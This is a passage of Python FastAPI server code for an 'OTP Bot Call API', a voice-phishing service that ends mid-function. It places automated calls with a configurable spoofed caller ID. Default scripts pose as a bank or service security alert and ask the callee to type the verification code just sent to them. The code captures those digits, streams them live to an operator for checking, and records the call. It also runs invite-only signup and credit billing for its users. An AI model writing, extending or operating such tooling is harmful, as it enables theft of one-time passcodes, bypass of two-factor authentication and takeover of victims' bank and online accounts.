from fastapi import FastAPI, APIRouter, HTTPException, Depends, status, Request
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.responses import Response
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict, EmailStr
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import httpx
import jwt
from passlib.context import CryptContext
import socketio
import asyncio
import json
from elevenlabs import ElevenLabs
from deepgram import DeepgramClient

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Infobip configuration
INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY')
INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL', 'qdnddq.api.infobip.com')
INFOBIP_CALLS_CONFIG_ID = os.environ.get('INFOBIP_CALLS_CONFIG_ID')

# ElevenLabs configuration
ELEVENLABS_API_KEY = os.environ.get('ELEVENLABS_API_KEY')
elevenlabs_client = ElevenLabs(api_key=ELEVENLABS_API_KEY) if ELEVENLABS_API_KEY else None

# Deepgram configuration
DEEPGRAM_API_KEY = os.environ.get('DEEPGRAM_API_KEY')
deepgram_client = DeepgramClient(api_key=DEEPGRAM_API_KEY) if DEEPGRAM_API_KEY else None

# Webhook base URL
WEBHOOK_BASE_URL = "https://ivrflow.preview.emergentagent.com/api"

# JWT configuration
JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY', 'default_secret')
JWT_ALGORITHM = os.environ.get('JWT_ALGORITHM', 'HS256')
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.environ.get('ACCESS_TOKEN_EXPIRE_MINUTES', 1440))

# Password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Socket.IO for real-time updates - use /api/socket.io path for ingress routing
sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')

# Create FastAPI app
fastapi_app = FastAPI(title="OTP Bot Call API", version="2.0.0")

# Create Socket.IO ASGI app with custom path that works with ingress
app = socketio.ASGIApp(sio, fastapi_app, socketio_path='/api/socket.io')

# Store active sessions - key is call_id for faster lookup
active_sessions: Dict[str, Dict[str, Any]] = {}
call_to_session: Dict[str, str] = {}  # call_id -> session_id mapping

# Create routers
api_router = APIRouter(prefix="/api")
auth_router = APIRouter(prefix="/auth", tags=["Authentication"])
voice_router = APIRouter(prefix="/voice", tags=["Voice Calls"])
otp_router = APIRouter(prefix="/otp", tags=["OTP Bot"])
admin_router = APIRouter(prefix="/admin", tags=["Admin"])
user_router = APIRouter(prefix="/user", tags=["User Profile"])


# ==================== MODELS ====================

from models import (
    UserCreate as UserCreateModel,
    UserUpdate,
    PasswordChange,
    CreditUpdate
)

class UserCreate(BaseModel):
    email: EmailStr
    password: str
    name: str
    role: str = "user"
    credits: float = 0

class UserLogin(BaseModel):
    email: EmailStr
    password: str


class UserRegister(BaseModel):
    email: EmailStr
    password: str
    name: str
    invitation_code: str


class UserResponse(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str
    email: str
    name: str
    role: str = "user"
    credits: float = 0
    is_active: bool = True
    created_at: str
    created_by: Optional[str] = None

class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    user: UserResponse

class OTPCallConfig(BaseModel):
    recipient_number: str = Field(..., description="Target phone number")
    caller_id: str = Field(default="+14245298701", description="Display caller ID")
    recipient_name: str = Field(default="User", description="Name for greeting")
    service_name: str = Field(default="Account", description="Service name")
    bank_name: str = Field(default="", description="Bank name for card templates")
    card_type: str = Field(default="Visa", description="Card type (Visa, Mastercard, etc)")
    ending_card: str = Field(default="", description="Last 4 digits of card")
    otp_digits: int = Field(default=6, description="Expected OTP digit count")
    language: str = Field(default="en", description="Language code")
    voice_name: str = Field(default="Joanna", description="Voice model name or ID")
    voice_provider: str = Field(default="infobip", description="TTS provider (infobip/elevenlabs/deepgram)")
    
    step1_message: str = Field(
        default="Hello {name}, we have detected a login attempt to your {service} account from a new device or location. If you did not recognize this request, please press 1. If this was you, press 0 to approve.",
        description="Step 1 greeting message"
    )
    step2_message: str = Field(
        default="Alright, we just sent a {digits} digit verification code to your number. If you received it, could you please enter it using your dial pad?",
        description="Step 2 OTP request message"
    )
    step3_message: str = Field(
        default="Okay, please wait a moment while we verify the code.",
        description="Step 3 verification message"
    )
    accepted_message: str = Field(
        default="Okay! We've declined the sign-in request, and your account is safe. Thanks for your time. Have a nice day!",
        description="Accepted/End message"
    )
    rejected_message: str = Field(
        default="I'm sorry, but the code you entered is incorrect. Could you please enter it again?",
        description="Rejected/Retry message"
    )

# ==================== AUTH HELPERS ====================

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)

def create_access_token(data: dict) -> str:
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
        user_id = payload.get("sub")
        if user_id is None:
            raise HTTPException(status_code=401, detail="Invalid token")
        
        user = await db.users.find_one({"id": user_id}, {"_id": 0})
        if user is None:
            raise HTTPException(status_code=401, detail="User not found")
        
        # Check if token is still active (single session enforcement)
        active_token = user.get("active_token")
        if active_token and active_token != token:
            raise HTTPException(status_code=401, detail="Session expired. You have been logged in from another device.")
        
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def get_admin_user(current_user: dict = Depends(get_current_user)):
    """Verify user is admin"""
    if current_user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Admin access required")
    return current_user

async def log_activity(user_id: str, action_type: str, details: dict = None):
    """Log user activity to database"""
    activity = {
        "id": str(uuid.uuid4()),
        "user_id": user_id,
        "action_type": action_type,
        "details": details or {},
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    await db.user_activities.insert_one(activity)

# ==================== SOCKET.IO EVENTS ====================

@sio.event
async def connect(sid, environ):
    logger.info(f"Client connected: {sid}")

@sio.event
async def disconnect(sid):
    logger.info(f"Client disconnected: {sid}")

@sio.event
async def join_session(sid, data):
    session_id = data.get('session_id')
    if session_id:
        await sio.enter_room(sid, session_id)
        logger.info(f"Client {sid} joined session {session_id}")
        
        # Send existing logs to the client
        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if session and session.get("logs"):
            for log_entry in session["logs"]:
                await sio.emit('call_log', log_entry, room=sid)

async def emit_log(session_id: str, log_type: str, message: str, data: dict = None):
    """Emit log event to all clients in a session"""
    timestamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
    log_entry = {
        "timestamp": timestamp,
        "type": log_type,
        "message": message,
        "data": data or {}
    }
    
    # Store log in database
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$push": {"logs": log_entry}}
    )
    
    # Emit to connected clients
    await sio.emit('call_log', log_entry, room=session_id)
    await sio.emit('session_update', {"session_id": session_id, "log": log_entry})
    logger.info(f"[{session_id}] {log_type}: {message}")

# ==================== INFOBIP CALLS API HELPERS ====================

def get_infobip_headers():
    return {
        "Authorization": f"App {INFOBIP_API_KEY}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }

def get_infobip_url(path: str) -> str:
    base = INFOBIP_BASE_URL if INFOBIP_BASE_URL.startswith('http') else f"https://{INFOBIP_BASE_URL}"
    return f"{base}{path}"

async def infobip_request(method: str, path: str, data: dict = None) -> dict:
    """Make request to Infobip API"""
    url = get_infobip_url(path)
    headers = get_infobip_headers()
    
    async with httpx.AsyncClient(timeout=30.0) as http_client:
        if method == "POST":
            response = await http_client.post(url, headers=headers, json=data)
        elif method == "GET":
            response = await http_client.get(url, headers=headers)
        else:
            raise ValueError(f"Unsupported method: {method}")
        
        logger.info(f"Infobip {method} {path}: {response.status_code}")
        
        try:
            resp_data = response.json() if response.text else {}
        except:
            resp_data = {"raw": response.text}
            
        return {"status_code": response.status_code, "data": resp_data}

async def create_outbound_call(to_number: str, from_number: str) -> dict:
    """Create outbound call using Calls API with recording and AMD enabled"""
    payload = {
        "endpoint": {
            "type": "PHONE",
            "phoneNumber": to_number
        },
        "from": from_number,
        "callsConfigurationId": INFOBIP_CALLS_CONFIG_ID,
        "machineDetection": {
            "enabled": True
        },
        "recording": {
            "recordingType": "AUDIO",
            "recordingComposition": {
                "enabled": True
            }
        }
    }
    
    return await infobip_request("POST", "/calls/1/calls", payload)

async def play_tts(call_id: str, text: str, language: str = "en", session_id: str = None):
    """Play TTS on active call - supports multiple providers"""
    voice_provider = "infobip"
    voice_name = None
    audio_urls = {}
    
    # Debug logging
    logger.info(f"play_tts called: call_id={call_id}, session_id={session_id}")
    
    # Get voice info from session if available
    if session_id and session_id in active_sessions:
        session = active_sessions[session_id]
        voice_provider = session.get("voice_provider", "infobip")
        voice_name = session.get("voice_name")
        audio_urls = session.get("audio_urls", {})
        logger.info(f"Session found: provider={voice_provider}, voice={voice_name}, audio_urls_count={len(audio_urls)}")
    else:
        logger.warning(f"Session not found in active_sessions. session_id={session_id}, active={list(active_sessions.keys())[:3]}")
    
    if voice_provider == "infobip" or not voice_name:
        # Use Infobip native TTS
        payload = {
            "text": text,
            "language": language
        }
        logger.info(f"Playing Infobip TTS on {call_id}: {text[:50]}...")
        return await infobip_request("POST", f"/calls/1/calls/{call_id}/say", payload)
    
    else:
        # For ElevenLabs/Deepgram - check if pre-generated audio exists
        # Match text with pre-generated messages
        audio_url = None
        
        if audio_urls:
            # Try to match by text content
            session_messages = {}
            if session_id and session_id in active_sessions:
                session_messages = active_sessions[session_id].get("messages", {})
            
            # Match text with message type
            for msg_type in ["step1", "step2", "step3", "accepted", "rejected"]:
                if msg_type in session_messages and session_messages[msg_type] == text:
                    audio_url = audio_urls.get(msg_type)
                    logger.info(f"Matched text to message type: {msg_type}")
                    break
        
        if audio_url:
            # Use pre-generated audio
            logger.info(f"Playing pre-generated {voice_provider} audio: {audio_url}")
            payload = {
                "content": {
                    "fileUrl": audio_url,
                    "type": "URL"
                }
            }
            return await infobip_request("POST", f"/calls/1/calls/{call_id}/play", payload)
        else:
            # No pre-generated audio - fallback to Infobip
            logger.warning(f"No pre-generated audio for this message, using Infobip fallback")
            payload = {"text": text, "language": language}
            return await infobip_request("POST", f"/calls/1/calls/{call_id}/say", payload)
    logger.info(f"Playing TTS on {call_id}: {text[:50]}...")
    return await infobip_request("POST", f"/calls/1/calls/{call_id}/say", payload)

async def start_dtmf_capture(call_id: str, max_length: int, timeout: int = 30):
    """Start capturing DTMF digits"""
    payload = {
        "maxLength": max_length,
        "timeout": timeout
    }
    logger.info(f"Starting DTMF capture on {call_id}, max_length={max_length}")
    return await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf", payload)

async def stop_dtmf_capture(call_id: str):
    """Stop capturing DTMF"""
    return await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf/stop", {})

async def hangup_call(call_id: str):
    """Hangup the call"""
    return await infobip_request("POST", f"/calls/1/calls/{call_id}/hangup", {})

async def get_call_status(call_id: str) -> dict:
    """Get call status from Infobip"""
    return await infobip_request("GET", f"/calls/1/calls/{call_id}")

async def get_call_recording(call_id: str) -> dict:
    """Get call recording from Infobip"""
    return await infobip_request("GET", f"/calls/1/recordings/calls/{call_id}")

async def fetch_and_emit_recording(session_id: str, call_id: str):
    """Fetch recording URL and emit to frontend"""
    try:
        # Wait a few seconds for recording to be processed
        await asyncio.sleep(5)
        
        # Try to get recording
        for attempt in range(3):
            recording = await get_call_recording(call_id)
            logger.info(f"Recording response for {call_id}: {recording}")
            
            if recording["status_code"] == 200:
                data = recording["data"]
                files = data.get("files", [])
                
                if files:
                    file_info = files[0]
                    file_id = file_info.get("id")
                    duration = file_info.get("duration", 0)
                    
                    if file_id:
                        await emit_log(session_id, "recording", f"🎤 Recording available ({duration}s)", {"fileId": file_id, "duration": duration})
                        await db.otp_sessions.update_one(
                            {"id": session_id},
                            {"$set": {"recording_file_id": file_id, "recording_duration": duration}}
                        )
                        
                        # Update call_history with recording info
                        await db.call_history.update_one(
                            {"session_id": session_id},
                            {"$set": {"recording_file_id": file_id, "recording_duration": duration}}
                        )
                        
                        logger.info(f"Recording file ID saved: {file_id}")
                        return
            
            # Wait before retry
            await asyncio.sleep(3)
        
        logger.warning(f"No recording found for call {call_id}")
        
    except Exception as e:
        logger.error(f"Error fetching recording: {e}")


async def save_call_history(session_id: str, session: dict, call_id: str, status: str):
    """Helper function to save call history"""
    call_start_time = session.get("call_start_time")
    if not call_start_time:
        logger.warning(f"No call_start_time for session {session_id}, cannot save history")
        return
    
    try:
        start_dt = datetime.fromisoformat(call_start_time.replace('Z', '+00:00'))
        end_dt = datetime.now(timezone.utc)
        duration_seconds = int((end_dt - start_dt).total_seconds())
        
        # Calculate cost
        import math
        duration_minutes = math.ceil(duration_seconds / 60)
        cost_credits = max(1, duration_minutes)
        
        # Deduct remaining credits
        additional_credits = cost_credits - 1
        if additional_credits > 0:
            await db.users.update_one(
                {"id": session.get("user_id")},
                {"$inc": {"credits": -additional_credits}}
            )
        
        # Save to call_history
        call_history_doc = {
            "id": str(uuid.uuid4()),
            "user_id": session.get("user_id"),
            "session_id": session_id,
            "call_id": call_id,
            "recipient_number": session.get("recipient_number"),
            "duration_seconds": duration_seconds,
            "cost_credits": cost_credits,
            "status": status,
            "voice_provider": session.get("voice_provider", "infobip"),
            "voice_name": session.get("voice_name", "default"),
            "template_type": "custom",
            "otp_captured": session.get("otp_received"),
            "amd_result": session.get("amd_result"),
            "recording_url": session.get("recording_url"),
            "recording_file_id": session.get("recording_file_id"),
            "created_at": call_start_time,
            "ended_at": end_dt.isoformat()
        }
        await db.call_history.insert_one(call_history_doc)
        
        # Log activity
        await log_activity(session.get("user_id"), "call_ended", {
            "session_id": session_id,
            "duration_seconds": duration_seconds,
            "cost_credits": cost_credits,
            "status": status
        })
        
        await emit_log(session_id, "info", f"💰 Call cost: {cost_credits} credits ({duration_minutes} min)")
        logger.info(f"Call history saved: {session_id}, duration={duration_seconds}s, cost={cost_credits}")
        
    except Exception as e:
        logger.error(f"Error saving call history: {e}")

async def wait_and_play_step1(session_id: str, session: dict, call_id: str):
    """Wait for call to be established then play Step 1 with retry"""
    try:
        # Wait for call to be answered (poll status)
        max_attempts = 30  # 30 seconds max wait
        ringing_logged = False
        
        for attempt in range(max_attempts):
            await asyncio.sleep(1)
            
            # Check call status
            result = await get_call_status(call_id)
            if result["status_code"] == 200:
                call_state = result["data"].get("state", "")
                logger.info(f"Call {call_id} state: {call_state}")
                
                # Log ringing state
                if call_state == "CALLING" and not ringing_logged:
                    await emit_log(session_id, "ringing", "📞 Ringing...")
                    ringing_logged = True
                
                if call_state == "ESTABLISHED":
                    # Call answered - record start time and wait for AMD result
                    call_start_time = datetime.now(timezone.utc).isoformat()
                    await db.otp_sessions.update_one(
                        {"id": session_id},
                        {"$set": {"call_start_time": call_start_time}}
                    )
                    if session_id in active_sessions:
                        active_sessions[session_id]["call_start_time"] = call_start_time
                    
                    await emit_log(session_id, "answered", "🤳 Call Answered - analyzing...")
                    
                    # Wait for AMD webhook event (max 6 seconds)
                    amd_timeout = 6
                    for i in range(amd_timeout):
                        await asyncio.sleep(1)
                        # Check if AMD result received via webhook
                        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
                        if fresh_session and fresh_session.get("amd_result"):
                            amd_result = fresh_session.get("amd_result")
                            logger.info(f"AMD result from webhook: {amd_result}")
                            break
                    else:
                        # No AMD result after 6 seconds - check from API response or assume HUMAN
                        amd_result = result["data"].get("machineDetection", {}).get("detectionResult") or "HUMAN"
                        await emit_log(session_id, "amd", f"👤 AMD Detection: {amd_result}", {"result": amd_result})
                    
                    # Check if call was already terminated by AMD webhook handler
                    fresh_status = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0, "status": 1})
                    if fresh_status and fresh_status.get("status") in ["voicemail_detected", "fax_detected", "beep_detected", "music_detected"]:
                        logger.info(f"Call already terminated by AMD handler: {fresh_status.get('status')}")
                        return
                    
                    # Continue normal flow for HUMAN or allowed types
                    if amd_result in ["HUMAN", "SILENCE", "NOISE", "OTHER"]:
                        # Update status
                        await db.otp_sessions.update_one(
                            {"id": session_id},
                            {"$set": {"status": "step1", "current_step": 1, "amd_result": amd_result, "step1_play_count": 0}}
                        )
                        active_sessions[session_id]["current_step"] = 1
                        active_sessions[session_id]["status"] = "step1"
                        active_sessions[session_id]["step1_play_count"] = 0
                        
                        # Play Step 1 with retry logic (x2)
                        await play_step1_with_retry(session_id, session, call_id)
                    return
                
                elif call_state == "BUSY":
                    await emit_log(session_id, "busy", "📵 Line Busy")
                    await db.otp_sessions.update_one(
                        {"id": session_id},
                        {"$set": {"status": "busy"}}
                    )
                    return
                    
                elif call_state in ["FINISHED", "FAILED", "HANGUP"]:
                    error_code = result["data"].get("errorCode", {})
                    error_name = error_code.get("name", "UNKNOWN")
                    
                    if error_name == "NO_ANSWER":
                        await emit_log(session_id, "no_answer", "📵 No Answer")
                    elif error_name == "USER_BUSY":
                        await emit_log(session_id, "busy", "📵 Line Busy")
                    elif error_name == "CALL_REJECTED":
                        await emit_log(session_id, "rejected", "📴 Call Rejected")
                    else:
                        await emit_log(session_id, "info", f"📴 Call ended: {error_name}")
                    
                    await db.otp_sessions.update_one(
                        {"id": session_id},
                        {"$set": {"status": "completed"}}
                    )
                    
                    # Try to get recording
                    await asyncio.sleep(2)
                    recording = await get_call_recording(call_id)
                    if recording["status_code"] == 200:
                        recordings = recording["data"].get("recordings", [])
                        if recordings:
                            recording_url = recordings[0].get("url")
                            if recording_url:
                                await emit_log(session_id, "recording", "🎤 Recording available", {"url": recording_url})
                                await db.otp_sessions.update_one(
                                    {"id": session_id},
                                    {"$set": {"recording_url": recording_url}}
                                )
                    return
                    
        logger.warning(f"Call {call_id} did not connect after {max_attempts} attempts")
        await emit_log(session_id, "no_answer", "📵 No Answer - Timeout")
        
    except Exception as e:
        logger.error(f"Error in wait_and_play_step1: {e}", exc_info=True)

async def play_step1_with_retry(session_id: str, session: dict, call_id: str):
    """Play Step 1 message with retry (x2) if no response"""
    step1_text = session["messages"]["step1"]
    
    for play_count in range(1, 3):  # Play 1 and Play 2
        # Check if already responded (moved to step 2)
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if fresh_session and fresh_session.get("current_step", 1) >= 2:
            logger.info(f"Step 1 already responded, skipping play {play_count}")
            return
        
        await emit_log(session_id, "step", f"🎙️ Playing Step 1 message (Play {play_count}/2)...")
        await db.otp_sessions.update_one(
            {"id": session_id},
            {"$set": {"step1_play_count": play_count}}
        )
        
        await play_tts(call_id, step1_text, session.get("language", "en"), session_id)
        
        # Wait for TTS to finish
        word_count = len(step1_text.split())
        tts_wait = max(8, int(word_count / 2.5) + 2)
        await asyncio.sleep(tts_wait)
        
        # Check again if already responded
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if fresh_session and fresh_session.get("current_step", 1) >= 2:
            logger.info(f"Step 1 responded during TTS play {play_count}")
            return
        
        await emit_log(session_id, "info", "⏳ Waiting for user input (1 or 0)...")
        await start_dtmf_capture(call_id, max_length=1, timeout=15 if play_count == 1 else 20)
        
        # Wait for response
        wait_time = 15 if play_count == 1 else 20
        for _ in range(wait_time):
            await asyncio.sleep(1)
            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
            if fresh_session and fresh_session.get("current_step", 1) >= 2:
                logger.info(f"Step 1 responded during wait after play {play_count}")
                return
        
        if play_count == 1:
            await emit_log(session_id, "warning", "⚠️ No response, playing message again...")
    
    # No response after 2 plays - hangup
    await emit_log(session_id, "error", "❌ No response after 2 attempts, ending call...")
    await hangup_call(call_id)

async def play_step2_with_retry(session_id: str, session: dict, call_id: str, otp_digits: int):
    """Play Step 2 message with retry (x2) if no OTP entered"""
    step2_text = session["messages"]["step2"]
    
    for play_count in range(1, 3):  # Play 1 and Play 2
        # Check if already got OTP (moved to step 3)
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if fresh_session and fresh_session.get("current_step", 1) >= 3:
            logger.info(f"Step 2 already responded, skipping play {play_count}")
            return
        
        await emit_log(session_id, "step", f"🎙️ Playing Step 2: OTP Request (Play {play_count}/2)...")
        await db.otp_sessions.update_one(
            {"id": session_id},
            {"$set": {"step2_play_count": play_count}}
        )
        
        await play_tts(call_id, step2_text, session.get("language", "en"), session_id)
        
        # Wait for TTS to finish - but check frequently if OTP was received
        word_count = len(step2_text.split())
        tts_wait = max(6, int(word_count / 2.5) + 2)
        for _ in range(tts_wait):
            await asyncio.sleep(1)
            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
            if fresh_session and fresh_session.get("current_step", 1) >= 3:
                logger.info(f"Step 2 OTP received during TTS play {play_count}")
                return
        
        # Check again if already got OTP
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if fresh_session and fresh_session.get("current_step", 1) >= 3:
            logger.info(f"Step 2 responded during TTS play {play_count}")
            return
        
        await emit_log(session_id, "info", f"⏳ Waiting for {otp_digits}-digit OTP...")
        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=30)
        
        # Wait for OTP - check every second
        wait_time = 25 if play_count == 1 else 30
        for _ in range(wait_time):
            await asyncio.sleep(1)
            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
            if fresh_session and fresh_session.get("current_step", 1) >= 3:
                logger.info(f"Step 2 responded during wait after play {play_count}")
                return
        
        if play_count == 1:
            await emit_log(session_id, "warning", "⚠️ No OTP entered, playing message again...")
    
    # No OTP after 2 plays - hangup
    await emit_log(session_id, "error", "❌ No OTP entered after 2 attempts, ending call...")
    await hangup_call(call_id)

async def play_step3_with_retry(session_id: str, session: dict, call_id: str):
    """Play Step 3 message with retry (x2) while waiting for admin"""
    step3_text = session["messages"]["step3"]
    
    for play_count in range(1, 3):  # Play 1 and Play 2
        # Check if admin already responded
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        status = fresh_session.get("status", "") if fresh_session else ""
        if status in ["completed", "step2"]:  # completed = accepted, step2 = rejected and retry
            logger.info(f"Step 3 admin already responded, skipping play {play_count}")
            return
        
        await emit_log(session_id, "step", f"🎙️ Playing Step 3: Please Wait (Play {play_count}/2)...")
        await play_tts(call_id, step3_text, session.get("language", "en"), session_id)
        
        # Wait for TTS to finish
        word_count = len(step3_text.split())
        tts_wait = max(5, int(word_count / 2.5) + 2)
        await asyncio.sleep(tts_wait)
        
        await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
        
        # Wait for admin response
        wait_time = 30 if play_count == 1 else 40
        for _ in range(wait_time):
            await asyncio.sleep(1)
            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
            status = fresh_session.get("status", "") if fresh_session else ""
            if status in ["completed", "step2"]:
                logger.info(f"Step 3 admin responded during wait after play {play_count}")
                return
        
        if play_count == 1:
            await emit_log(session_id, "warning", "⚠️ No admin response, playing message again...")
    
    # No admin response after 2 plays - keep waiting (don't hangup, admin might still respond)
    await emit_log(session_id, "info", "⏳ Still waiting for admin approval...")

async def play_step3_retry_only(session_id: str, session: dict, call_id: str):
    """Play Step 3 retry (Play 2 only) - called after Play 1 is already done"""
    step3_text = session["messages"]["step3"]
    
    # Wait for TTS Play 1 to finish first
    word_count = len(step3_text.split())
    tts_wait = max(5, int(word_count / 2.5) + 2)
    await asyncio.sleep(tts_wait)
    
    # Wait for admin response (30 seconds for first wait)
    for _ in range(30):
        await asyncio.sleep(1)
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        status = fresh_session.get("status", "") if fresh_session else ""
        if status in ["completed", "step2"]:
            logger.info("Step 3 admin responded during wait")
            return
    
    # No response - play message again (Play 2)
    fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    status = fresh_session.get("status", "") if fresh_session else ""
    if status in ["completed", "step2"]:
        return
    
    await emit_log(session_id, "warning", "⚠️ No admin response, playing message again...")
    await emit_log(session_id, "step", "🎙️ Playing Step 3: Please Wait (Play 2/2)...")
    await play_tts(call_id, step3_text, session.get("language", "en"), session_id)
    
    # Wait for TTS to finish
    await asyncio.sleep(tts_wait)
    
    await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
    
    # Wait for admin response (40 seconds for second wait)
    for _ in range(40):
        await asyncio.sleep(1)
        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        status = fresh_session.get("status", "") if fresh_session else ""
        if status in ["completed", "step2"]:
            logger.info("Step 3 admin responded during wait after play 2")
            return
    
    # No admin response after 2 plays - keep waiting
    await emit_log(session_id, "info", "⏳ Still waiting for admin approval...")

# ==================== AUTH ROUTES ====================

@auth_router.post("/login", response_model=TokenResponse)
async def login(credentials: UserLogin):
    user = await db.users.find_one({"email": credentials.email}, {"_id": 0})
    if not user or not verify_password(credentials.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    
    # Generate new token
    access_token = create_access_token({"sub": user["id"]})
    
    # Save token to database (this will invalidate previous token/session)
    await db.users.update_one(
        {"id": user["id"]},
        {"$set": {"active_token": access_token, "last_login": datetime.now(timezone.utc).isoformat()}}
    )
    
    # Log login activity
    await log_activity(user["id"], "login", {"login_time": datetime.now(timezone.utc).isoformat()})
    
    return TokenResponse(
        access_token=access_token,
        user=UserResponse(
            id=user["id"], 
            email=user["email"], 
            name=user["name"], 
            role=user.get("role", "user"),
            credits=user.get("credits", 0),
            is_active=user.get("is_active", True),
            created_at=user["created_at"]
        )
    )


@auth_router.post("/logout")
async def logout(current_user: dict = Depends(get_current_user)):
    """Logout - clear active token"""
    await db.users.update_one(
        {"id": current_user["id"]},
        {"$unset": {"active_token": ""}}
    )
    await log_activity(current_user["id"], "logout", {})
    return {"message": "Logged out successfully"}



@auth_router.post("/register", response_model=TokenResponse)
async def register_with_invite(user_data: UserRegister):
    """Public registration with invitation code"""
    # Validate invitation code
    invite = await db.invitation_codes.find_one({"code": user_data.invitation_code}, {"_id": 0})
    
    if not invite:
        raise HTTPException(status_code=400, detail="Invalid invitation code")
    
    if invite.get("is_used"):
        raise HTTPException(status_code=400, detail="Invitation code already used")
    
    # Check if email exists
    existing = await db.users.find_one({"email": user_data.email}, {"_id": 0})
    if existing:
        raise HTTPException(status_code=400, detail="Email already registered")
    
    # Create user with credits from invitation
    user_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    new_user = {
        "id": user_id,
        "email": user_data.email,
        "password_hash": hash_password(user_data.password),
        "name": user_data.name,
        "role": "user",
        "credits": invite.get("credits_for_new_user", 10),
        "is_active": True,
        "created_at": now,
        "created_by": invite.get("created_by"),
        "invited_by_code": user_data.invitation_code
    }
    
    await db.users.insert_one(new_user)
    
    # Mark invitation code as used
    update_result = await db.invitation_codes.update_one(
        {"code": user_data.invitation_code},
        {"$set": {
            "is_used": True,
            "used_by": user_id,
            "used_at": now
        }}
    )
    logger.info(f"Invitation code {user_data.invitation_code} marked as used. Modified: {update_result.modified_count}")
    
    # Log activity
    await log_activity(user_id, "user_registered", {
        "invitation_code": user_data.invitation_code,
        "invited_by": invite.get("created_by")
    })
    
    # Auto-login
    access_token = create_access_token({"sub": user_id})
    
    return TokenResponse(
        access_token=access_token,
        user=UserResponse(
            id=new_user["id"],
            email=new_user["email"],
            name=new_user["name"],
            role=new_user["role"],
            credits=new_user["credits"],
            is_active=new_user["is_active"],
            created_at=new_user["created_at"]
        )
    )


@auth_router.get("/me", response_model=UserResponse)
async def get_me(current_user: dict = Depends(get_current_user)):
    return UserResponse(
        id=current_user["id"],
        email=current_user["email"],
        name=current_user["name"],
        role=current_user.get("role", "user"),
        credits=current_user.get("credits", 0),
        is_active=current_user.get("is_active", True),
        created_at=current_user["created_at"]
    )



# ==================== ADMIN ROUTES ====================

@admin_router.get("/users")
async def get_all_users(admin: dict = Depends(get_admin_user)):
    """Get all users (admin only)"""
    users = await db.users.find({}, {"_id": 0, "password_hash": 0}).to_list(1000)
    return {"users": users}

@admin_router.post("/users")
async def create_user(user_data: UserCreate, admin: dict = Depends(get_admin_user)):
    """Create new user (admin only)"""
    # Check if email exists
    existing = await db.users.find_one({"email": user_data.email}, {"_id": 0})
    if existing:
        raise HTTPException(status_code=400, detail="Email already registered")
    
    # Create user
    user_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    new_user = {
        "id": user_id,
        "email": user_data.email,
        "password_hash": hash_password(user_data.password),
        "name": user_data.name,
        "role": user_data.role,
        "credits": user_data.credits,
        "is_active": True,
        "created_at": now,
        "created_by": admin["id"]
    }
    
    await db.users.insert_one(new_user)
    
    # Log activity
    await log_activity(admin["id"], "user_created", {"created_user_id": user_id, "email": user_data.email})
    
    return {"message": "User created successfully", "user_id": user_id}

@admin_router.put("/users/{user_id}")
async def update_user(user_id: str, user_data: UserUpdate, admin: dict = Depends(get_admin_user)):
